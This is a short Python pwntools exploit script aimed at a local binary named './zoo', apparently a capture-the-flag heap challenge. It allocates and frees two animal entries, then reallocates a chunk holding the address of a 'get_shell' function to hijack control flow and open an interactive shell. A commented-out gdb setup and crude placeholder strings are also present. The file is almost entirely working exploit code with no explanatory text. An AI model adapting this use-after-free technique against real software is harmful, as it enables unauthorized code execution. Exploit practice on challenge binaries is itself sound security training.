from pwn import * 

binary = "./zoo"

p = process(binary)
s = '''
set follow-fork-mode parent
set follow-exec-mode same
b * add_animal+381  
'''
#gdb.attach(p, s)
x = 0x10
print(str(x))
def add_animal(size, name):
    p.sendlineafter(b"0) Exit", b"1")
    p.sendlineafter(b"Type of animal?", b'1')
    p.sendlineafter(b"How long is the name? (max: 64 characters)", str(size))
    p.sendafter(b"Name of animal?", name)

def remove_animal(zone):
    p.sendlineafter(b"0) Exit", b"2")
    p.sendlineafter("Zone number? (0-9)", str(zone))

add_animal(0x30, "dick")
add_animal(0x30, "balls")
remove_animal(0)
remove_animal(1)
get_shell = 0x0000000000401276
add_animal(0x10, p64(get_shell))

p.interactive()